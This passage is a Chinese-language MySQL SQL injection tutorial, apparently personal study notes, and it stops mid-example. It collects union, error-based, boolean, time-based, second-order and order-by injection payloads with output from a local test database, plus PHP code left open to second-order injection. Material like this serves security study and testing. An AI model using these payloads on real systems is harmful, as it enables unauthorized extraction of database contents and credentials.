- [注释](#注释)
- [常用注入手段](#常用注入手段)
  - [联合查询注入](#联合查询注入)
  - [报错注入](#报错注入)
    - [数据类型溢出](#数据类型溢出)
    - [特殊的数学函数](#特殊的数学函数)
    - [xpath语法错误](#xpath语法错误)
    - [重复数据报错](#重复数据报错)
    - [调用不存在的函数可读取数据库名字](#调用不存在的函数可读取数据库名字)
    - [GTID函数](#gtid函数)
    - [JSON函数](#json函数)
    - [UUID](#uuid)
  - [布尔注入](#布尔注入)
  - [延时注入](#延时注入)
  - [堆叠注入](#堆叠注入)
  - [二次注入](#二次注入)
- [注入技巧](#注入技巧)
  - [order by注入](#order-by注入)
  - [limit注入](#limit注入)
  - [between and注入](#between-and注入)
  - [dnslog外带数据](#dnslog外带数据)
  - [文件读写](#文件读写)
  - [宽字节注入](#宽字节注入)
  - [约束攻击](#约束攻击)
  - [无列名注入](#无列名注入)
  - [insert update delete注入](#insert-update-delete注入)
- [未完待续...](#未完待续)

## 注释

```
1. #xxx
2. -- xxx 注意有一个空格
3. /*xxx*/
4. `xxx`
5. ;%00
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201202343264.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201202344062.png)

## 常用注入手段

### 联合查询注入

联合查询注入即在原有的查询语句中,通过`union`拼接传入的恶意语句,达到获取数据的目的(常用于有回显的情况)

正常查询语句 `select column_name from table where xxx`

恶意查询语句 `select column_name from table where xxx union select column_name (from table where xxx)`()可选

使用`union`进行拼接时,前后两个`select`语句所返回的字段数必须一致

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201210003541.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201210004035.png)

若仅回显一行数据则需要将部分`column_name`设置为空

### 报错注入

mysql在报错信息里可能会带有部分数据,利用这一特性进行注入,但要注意数据外带的长度限制

报错注入主要有以下几种

#### 数据类型溢出

在mysql版本大于`5.5`时才会产生溢出报错

[https://dev.mysql.com/doc/refman/5.7/en/integer-types.html](https://dev.mysql.com/doc/refman/5.7/en/integer-types.html)

[https://dev.mysql.com/doc/refman/5.7/en/out-of-range-and-overflow.html](https://dev.mysql.com/doc/refman/5.7/en/out-of-range-and-overflow.html)

|Type|Storage (Bytes)|Minimum Value Signed|Minimum Value Unsigned|Maximum Value Signed|Maximum Value Unsigned|
|:---:|:---:|:---:|:---:|:---:|:---:|
|TINYINT|1|-128|0|127|255|
|SMALLINT|2|-32768|0|32767|65535|
|MEDIUMINT|3|-8388608|0|8388607|16777215|
|INT|4|-2147483648|0|2147483647|4294967295|
|BIGINT|8|-2^63|0|2^63-1|2^64-1|

`2^64-1=18446744073709551615`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211058286.png)

如果一个查询成功执行,则其返回值为0,因此可以利用该返回值进行数学运算

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211134646.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211135283.png)

但是整型溢出报错并带出数据只能在某些特定版本使用,在版本大于`5.5.48`时报错不能带出数据

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211449716.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211451073.png)

>`exp()`此函数返回e(自然对数的底)的x次方的值

>`pow()`指数运算

>`cot()`cotan

```
select exp(~(select*from(select @@version)x));
select pow(2,~(select*from(select @@version)x));
select cot(!(select*from(select @@version)x));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211510567.png)

```
select !atan((select*from(select @@version)x))-~0;
select !cos((select*from(select @@version)x))-~0;
select !ceil((select*from(select @@version)x))-~0;
select !floor((select*from(select @@version)x))-~0;
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211417654.png)

#### 特殊的数学函数

几何对象函数

```
select multipoint((select*from(select*from(select @@version)x)y));
select geometrycollection((select*from(select*from(select @@version)x)y));
select polygon((select*from(select*from(select @@version)x)y));
select multipolygon((select*from(select*from(select @@version)x)y));
select linestring((select*from(select*from(select @@version)x)y));
select multilinestring((select*from(select*from(select @@version)x)y));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211426633.png)

空间函数

```
select ST_LongFromGeoHash((select*from(select*from(select @@version)x)y));
select ST_LatFromGeoHash((select*from(select*from(select @@version)x)y));
select ST_PointFromGeoHash((select*from(select*from(select @@version)x)y),1);
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211435901.png)

#### xpath语法错误

`ExtractValue()`和`UpdateXML()`

`ExtractValue(xml_frag, xpath_expr)`

`UpdateXML(xml_target, xpath_expr, new_xml)`

第二个参数都要求符合xpath语法,如果不符合就会报错并带有数据,通过在前后添加`~`即`0x7e`使其不符合xpath格式从而报错

```
select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
select extractvalue(1,concat(0x7e,(select @@version),0x7e));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211521265.png)

#### 重复数据报错

主键具有唯一性,主键重复则会报错

```
select * from table3;
+----+------+
| id | info |
+----+------+
| 1  | a    |
| 2  | a    |
| 3  | b    |
| 4  | c    |
| 5  | c    |
+----+------+
```

`select count(*) from table3 group by info;`

首先建立一个空的虚拟表

|info(primary key)|count|
|:---:|:---:|
|||

从数据库中查询数据,检查虚拟表是否存在对应条目,不存在则插入新记录,存在则count字段加1

|info(primary key)|count|
|:---:|:---:|
|a|1|

|info(primary key)|count|
|:---:|:---:|
|a|2|

|info(primary key)|count|
|:---:|:---:|
|a|2|
|b|1|

|info(primary key)|count|
|:---:|:---:|
|a|2|
|b|1|
|c|1|

|info(primary key)|count|
|:---:|:---:|
|a|2|
|b|1|
|c|2|

`rand()`不能接在`order by/group by`后面

[https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand](https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)

RAND() in a WHERE clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). Thus, for optimizer purposes, RAND() is not a constant value and cannot be used for index optimizations

Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result

```
select floor(rand(0)*2) from `TABLES` limit 8;
+------------------+
| floor(rand(0)*2) |
+------------------+
| 0.0              |
| 1.0              |
| 1.0              |
| 0.0              |
| 1.0              |
| 1.0              |
| 0.0              |
| 0.0              |
+------------------+
```

`select count(*) from table3 group by floor(rand(0)*2);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212150136.png)

>`group by`只有在插入虚拟表时才会计算rand,更新时不会计算

首先,`group by floor(rand(0)*2)`被执行确定为`group by 0`,此时虚拟表为空,进行插入操作,此时`floor(rand(0)*2)`结果为`1`

已执行两次`rand`计算

|primary key|count|
|:---:|:---:|
|1|1|

然后,`group by floor(rand(0)*2)`被执行确定为`group by 1`,此时虚拟表存在该项`count+1`

已执行三次`rand`计算

|primary key|count|
|:---:|:---:|
|1|2|

然后,`group by floor(rand(0)*2)`被执行确定为`group by 0`,此时虚拟表不存在该项,进行插入操作,此时`floor(rand(0)*2)`结果为`1`,将要插入`1`但是此时虚拟表已存在`1`,因此主键冲突产生报错

已执行五次`rand`计算

因此表中需要有至少三条数据供`floor(rand(0)*2)`达到报错条件

```
select floor(rand(14)*2) from `TABLES` limit 4;
+-------------------+
| floor(rand(14)*2) |
+-------------------+
| 1.0               |
| 0.0               |
| 1.0               |
| 0.0               |
+-------------------+
```

>floor(rand(14)*2)产生随机序列1010...,因此表中可以只有两条数据

>如何利用该报错?

爆破库名

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212218318.png)

爆破表名

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212222673.png)

爆破列名

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='table3' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='table3' limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212227064.png)

爆破字段

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select group_concat(id) from table3),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select mid(group_concat(info),1,100) from table3),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212338165.png)

```
select column_name,column_type from information_schema.columns where table_name='table3';
+-------------+--------------+
| column_name | column_type  |
+-------------+--------------+
| id          | int(11)      |
| info        | varchar(255) |
+-------------+--------------+
```

---

列名具有唯一性,列名重复则会报错,利用这一特性可以进行无列名注入

>例子

利用name_const来制造一个列,但参数需要是常量(The arguments should be constants)

[https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const](https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211544831.png)

>无列名注入

[MySQL JOIN 菜鸟教程](https://www.runoob.com/mysql/mysql-join.html)

通过`join`可建立两个表之间的内连接,通过对要查询列名的表与其自身进行内连接,会产生的相同列名,从而发生错误带出数据(即列名)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211800660.png)

`using()`用于两张表之间的`join`连接查询,并且`using()`中的列在两张表中都存在,由此剔除掉前一次注入时得到的列名

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211803273.png)

```
select * from(select * from table1 as a join table1 as b)c;
select * from(select * from table1 as a join table1 as b using (id))c;
select * from(select * from table1 as a join table1 as b using (id,username))c;
```

#### 调用不存在的函数可读取数据库名字

```
select misaka();
(1305, 'FUNCTION sql_injection_test.misaka does not exist')
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212343727.png)

#### GTID函数

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242037203.png)

```
select gtid_subset(user(),1);
(1772, "Malformed GTID set specification 'root@172.18.0.1'.")
select gtid_subtract(user(),1);
(1772, "Malformed GTID set specification 'root@172.18.0.1'.")
select gtid_subtract((select group_concat(id) from sql_injection_test.table1),1);
(1772, "Malformed GTID set specification '1,2,3,4'.")
select gtid_subtract((select group_concat(username) from sql_injection_test.table1),1);
(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242045868.png)

```
select * from table1 where id='1' and gtid_subtract((select group_concat(username) from sql_injection_test.table1),1)='1'#
(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
select * from table1 where id='1' or gtid_subtract((select group_concat(username) from sql_injection_test.table1),1)='1'#
(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
```

#### JSON函数

据说有版本限制,未进行验证(当前测试版本为`5.7.11`)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242106092.png)

```
select json_array_append(user(),null,null);
(3141, 'Invalid JSON text in argument 1 to function json_array_append: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_array_append(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_array_append: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_array_insert(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_array_insert: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_insert(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_insert: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_merge(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_merge: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_merge_patch(user(),1,2);
(1305, 'FUNCTION information_schema.json_merge_patch does not exist')
select json_remove(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_remove: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_replace(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_replace: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_set(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_set: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
```

#### UUID

版本限制(大于`8.0`)

[https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html](https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242124969.png)

```
select uuid_to_bin(user())
(1411, "Incorrect string value: 'root@192.168.241.1' for function uuid_to_bin")
select bin_to_uuid(user())
(1411, "Incorrect string value: 'root@192.168.241.1' for function bin_to_uuid")
```

### 布尔注入

服务器根据sql语句的执行结果返回`success`或者是`fail`,通过构造语句利用服务器的返回值来判断数据是否符合预期

`select * from user where username='$username'`

`select * from user where username='$username' or 1#`构造永真条件,无论输入的用户名是什么都会返回`success`

```
select * from table3 where id='1' and length(database())>1
+----+------+
| id | info |
+----+------+
| 1  | a    |
+----+------+
1 row in set
Time: 0.008s
select * from table3 where id='1' and length(database())<1
+----+------+
| id | info |
+----+------+
0 rows in set
Time: 0.011s
```

```
select * from table3 where id='1' and mid((select group_concat(info) from table3),1,1)<50
+----+------+
| id | info |
+----+------+
| 1  | a    |
+----+------+
1 row in set
Time: 0.008s
select * from table3 where id='1' and mid((select group_concat(info) from table3),1,1)>50
+----+------+
| id | info |
+----+------+
0 rows in set
Time: 0.010s
```

### 延时注入

构造延时注入语句,根据服务器响应时间判断数据是否符合预期,常用于盲注

1. sleep

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212353818.png)

`select * from table3 where id='1' and if (length(database())>5,sleep(5),1)#`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212355619.png)

`select * from table3 where id='1' and if (ascii(substr((select group_concat(info) from table3),1,1))>50,sleep(5),1)#`

2. benchmark

`BENCHMARK(count,exp)`重复执行`count`次`exp`中的内容,其返回值为0

```
SELECT BENCHMARK(1000000,1+1);
+------------------------+
| BENCHMARK(1000000,1+1) |
+------------------------+
| 0                      |
+------------------------+
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201220004326.png)

`select * from table3 where id='1' and if (ascii(substr((select group_concat(info) from table3),1,1))>50,benchmark(10e7,1+1),1)#`

3. 笛卡尔积

可以大量消耗服务器资源

```
SELECT count(*) FROM information_schema.columns;
+----------+
| count(*) |
+----------+
| 3087     |
+----------+
1 row in set
Time: 0.030s
SELECT count(*) FROM information_schema.columns A,information_schema.columns B;
+----------+
| count(*) |
+----------+
| 9529569  |
+----------+
1 row in set
Time: 0.289s
SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;
跑很久...
```

```
select * from table3 where id='-1' or if (length(database())<1,(select count(*) from information_schema.columns a,information_schema.columns b),1)#
+----+------+
| id | info |
+----+------+
| 1  | a    |
| 2  | a    |
| 3  | b    |
| 4  | c    |
| 5  | c    |
+----+------+
5 rows in set
Time: 0.018s
select * from table3 where id='-1' or if (length(database())>1,(select count(*) from information_schema.columns a,information_schema.columns b),1)#
+----+------+
| id | info |
+----+------+
| 1  | a    |
| 2  | a    |
| 3  | b    |
| 4  | c    |
| 5  | c    |
+----+------+
5 rows in set
Time: 0.361s
```

1. get_lock

[https://dev.mysql.com/doc/refman/5.7/en/locking-functions.html](https://dev.mysql.com/doc/refman/5.7/en/locking-functions.html)

`GET_LOCK(str,timeout)`

尝试对`str`加锁,超时时间为`timeout`秒,负值`timeout`表示无限超时

在一个`session`中可以先锁定一个变量`select get_lock('misaka',1);`

然后通过另一个`session`再次执行get_lock函数`select get_lock('misaka',5);`此时会产生5秒的延迟，

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221227308.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201222322928.png)

`select * from table3 where id='-1' or if (length(database())>1,(select get_lock('misaka',5)),1)#`

5. rpad/repeat

构造恶意的正则匹配去消耗服务器资源,从而达到延时注入的目的

[RPAD(str,len,padstr)](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_rpad)

```
mysql> SELECT RPAD('hi',5,'?');
        -> 'hi???'
mysql> SELECT RPAD('hi',1,'?');
        -> 'h'
```

[REPEAT(str,count)](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_repeat)

```
mysql> SELECT REPEAT('MySQL', 3);
        -> 'MySQLMySQLMySQL'
```

首先利用`repeat`或者`rpad`构造超长的待匹配字符串,然后再次利用这两个函数去构造正则匹配规则,利用匹配规则进行多次匹配(通过`repeat`中的数据量来控制延迟时间)

```
select rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',100),'b');
+-------------------------------------------------------------+
| rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',100),'b') |
+-------------------------------------------------------------+
| 0                                                           |
+-------------------------------------------------------------+
1 row in set
Time: 0.726s

select rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b');
+-------------------------------------------------------------+
| rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b') |
+-------------------------------------------------------------+
| 0                                                           |
+-------------------------------------------------------------+
1 row in set
Time: 3.869s
```

```
select * from table1 where id='1' or if(length(database())>1,rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b'),0);
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
+----+----------+----------+-----------------+
1 row in set
Time: 3.297s
select * from table1 where id='1' or if(length(database())<1,rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b'),0);
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
+----+----------+----------+-----------------+
1 row in set
Time: 0.009s
```

### 堆叠注入

即多语句执行,例题可以参照sqli-labs的Less-38

>todo pdo多语句执行

### 二次注入

攻击者构造的恶意数据在数据库语句执行前进行了转义操作,但是服务器在从数据库中取出数据时没有进行相应的转义操作,导致了后续在进行语句拼接时产生的SQL注入问题

```php
public function add_user($username, $email, $password): bool
{
    $username = mysqli_real_escape_string($this->sql, $username);
    $email = mysqli_real_escape_string($this->sql, $email);
    $password = sha1($password);
    if ($this->check_user_exist($username)) {
        return false;
    }
    $sql_query = "INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL,'$username','$password')";
    $this->sql->query($sql_query);
    $sql_query = "INSERT INTO `email` (`id`, `username`, `email`, `time`) VALUES (NULL,'$username','$email',NOW())";
    $this->sql->query($sql_query);
    return true;
}
public function add_email($email)
{
    $id = $_SESSION['uid'];
    $sql_query = "SELECT username FROM users where id = '$id'";
    $row = mysqli_query($this->sql, $sql_query);
    $result = $row->fetch_all(MYSQLI_ASSOC);
    $username = $result[0]['username'];
    $email = mysqli_real_escape_string($this->sql, $email);
    $sql_query = "INSERT INTO `email` (`id`, `username`, `email`, `time`) VALUES (NULL,'$username','$email',NOW())";
    $this->sql->query($sql_query);
}
public function list_email()
{
    $id = $_SESSION['uid'];
    $sql_query = "SELECT username FROM users where id = '$id'";
    $row = mysqli_query($this->sql, $sql_query);
    $result = $row->fetch_all(MYSQLI_ASSOC);
    $username = $result[0]['username'];
    $sql_query = "SELECT email,time FROM email where username = '$username'";

    $row = mysqli_query($this->sql, $sql_query);
    $posi = 1;
    echo '<div class="container"><table class="table"><thead><tr><th scope="col">#</th><th scope="col">Email</th><th scope="col">Time</th></tr></thead><tbody>';
    while ($result = $row->fetch_assoc()) {
        echo '<tr><th scope="row">' . $posi++ . '</th><td>' . $result['email'] . '</td><td>' . $result['time'] . '</td></tr>';
    }
    echo '</tbody></table></div>';
}
```

可以看到`add_email`和`list_email`中所使用的`usernane`均来自数据库查询得到的结果,假设在注册时我们注册一个名为`' or 1#`的用户

在注册过程中,由于存在`mysqli_real_escape_string`,敏感字符会被转义后再执行sql语句,但是从数据库取出`username`后,并没有执行相应的`mysqli_real_escape_string`,因此`SELECT email,time FROM email where username = '$username'`会变成`SELECT email,time FROM email where username = '' or 1#'`因此造成了二次注入

## 注入技巧

### order by注入

`SELECT`语句使用`ORDER BY`子句将查询数据排序后再返回数据

1. 利用`rand`进行注入

`select * from users order by rand(0);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(%E5%B7%B2%E5%AE%8C%E6%88%90)/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-03%20095858.png)

`select * from users order by rand(1);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(%E5%B7%B2%E5%AE%8C%E6%88%90)/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-03%20095932.png)

可以看到由于`rand`结果的不同导致了排序结果的不同,利用这一点可以进行注入

例如`select * from users order by rand(length(database())=8);`可以根据回显数据排序的方式的不同来判断`database`名称的长度

`select * from users order by rand(ascii(substr((select group_concat(username) from users),1,1))<50);`二分法确定名字

>原理

```
mysql root@localhost:sql_injection_test> select id,rand(0) from table1;
+----+---------------------+
| id | rand(0)             |
+----+---------------------+
| 1  | 0.15522042769493574 |
| 2  | 0.620881741513388   |
| 3  | 0.6387474552157777  |
| 4  | 0.33109208227236947 |
+----+---------------------+
4 rows in set
Time: 0.010s
mysql root@localhost:sql_injection_test> select id,rand(0) from table1 order by rand(0);
+----+---------------------+
| id | rand(0)             |
+----+---------------------+
| 1  | 0.15522042769493574 |
| 4  | 0.33109208227236947 |
| 2  | 0.620881741513388   |
| 3  | 0.6387474552157777  |
+----+---------------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 order by rand(0);
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 4  | mike     | asdfqwer | mike@gmail.com  |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
```

```
mysql root@localhost:sql_injection_test> select id,rand(1) from table1;
+----+---------------------+
| id | rand(1)             |
+----+---------------------+
| 1  | 0.40540353712197724 |
| 2  | 0.8716141803857071  |
| 3  | 0.1418603212962489  |
| 4  | 0.09445909605776807 |
+----+---------------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select id,rand(1) from table1 order by rand(1);
+----+---------------------+
| id | rand(1)             |
+----+---------------------+
| 4  | 0.09445909605776807 |
| 3  | 0.1418603212962489  |
| 1  | 0.40540353712197724 |
| 2  | 0.8716141803857071  |
+----+---------------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 order by rand(1);
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 4  | mike     | asdfqwer | mike@gmail.com  |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
```

2. 利用`if`进行延时注入

`select * from users order by (if(ascii(substr((select group_concat(username) from users),1,1))>100,1,sleep(0.1)));`

如果`group_concat(username)`的首字母的ascii值大于100,则在正常时间内返回结果,如果不大于100,则会延迟一段时间(该时间并不直接等于sleep(0.1),而是与其查询的数据的条目数量相关,`延迟时间 = sleeptime * number`)

```
select * from table1 order by sleep(1)
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 4.018s
```

3. 利用`if`进行报错注入

```
mysql root@localhost:sql_injection_test> select * from table1 order by if(1=1,id,username)
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.009s
mysql root@localhost:sql_injection_test> select * from table1 order by if(1=2,id,username)
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
| 2  | tim      | 123456   | tim@qq.com      |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
```

`order by if(exp,id,username)`

```
mysql root@localhost:sql_injection_test> select * from table1 order by if(1=1,1,(select id from table1))
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 order by if(1=2,1,(select id from table1))
(1242, 'Subquery returns more than 1 row')
mysql root@localhost:sql_injection_test> select * from table1 order by if(length(database())>8,1,(select id from table1))
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 order by if(length(database())<8,1,(select id from table1))
(1242, 'Subquery returns more than 1 row')
```

4. 利用updatexml等进行报错注入

```
select * from users order by updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~information_schema,c~'
```

5. 结合union进行盲注

假定原始语句为`select username,password from table1 where username='$username'`,只对`username`字段进行回显,同时不知道列名,要求获得`admin`的密码

我们可以利用`union`和`order by`进行无列名盲注

```
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin';
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin!@# |
+----------+----------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,2 order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | 2        |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.011s
```

>加上binary,因为order by不区分大小写

```
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('a') order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | a        |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('b') order by 2
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin!@# |
| 1        | b        |
+----------+----------+
2 rows in set
Time: 0.009s
```

```
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('ac') order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | ac       |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('ad') order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | ad       |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.009s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('ae') order by 2
+----------+----------+
